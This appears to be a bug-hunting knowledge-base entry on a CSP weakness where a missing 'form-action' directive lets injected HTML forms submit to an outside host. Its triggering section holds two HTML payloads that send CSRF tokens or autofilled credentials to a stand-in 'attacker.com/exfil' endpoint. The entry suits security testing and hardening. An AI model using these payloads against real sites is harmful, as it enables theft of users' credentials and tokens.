---
title: CSP form-action gap — credential exfil via form hijack
slug: csp-form-action-gap
created_utc: 2026-05-13T00:00:00Z
updated_utc: 2026-05-13T00:00:00Z
tags: [technique/csrf, technique/csp-bypass]
inbound: []
---

# CSP form-action gap

## Pattern
`form-action` is NOT covered by CSP `default-src`. It's one of the few
non-fetch-based directives (alongside `frame-ancestors`). If a target
sets `default-src 'self'` but no explicit `form-action`, an injected form
can submit to an arbitrary action (attacker.com), exfiltrating CSRF tokens
or browser-autofilled credentials.

Google's CSP Evaluator does NOT flag missing `form-action`. Use
`cspvalidator.org` instead.

## Preconditions
- Target CSP missing `form-action 'self'` (or equivalent).
- HTML injection sink that renders a `<form>` (or attribute-only injection
  that lets you set `formaction`).

## Detection
- Inspect CSP header for `form-action`. Absence → exploit candidate.

## Triggering
HTML injection:
```html
<form action="https://attacker.com/exfil" method="POST">
  <input name="csrf" value="<browser-autofill>">
  <button>Click me</button>
</form>
```

Form-attribute primitive (works anywhere in DOM, NOT just inside `<form>`):
```html
<input form="victimFormId" formaction="https://attacker.com/exfil" formtarget="_blank">
```
Overrides the existing form's `action` + `target` on submit — see
[[form-attribute-smuggling]].

## Related
- [[form-attribute-smuggling]]
- Drag-and-drop payload delivery (Ep 69) — user-conditioned to drag
  CAPTCHA puzzles, drops payload into target input.

## Seen in the wild
- Recurring class on Rails Hotwire / Laravel Livewire / Phoenix LiveView
  hosts that use `default-src 'self'` without explicit `form-action`.
- Critical Thinking Podcast Ep 69 (Joaxcar).

## References
- Critical Thinking Podcast Ep 69
- cspvalidator.org
- Google CSP Evaluator (does NOT flag — open-source on GitHub for fork)
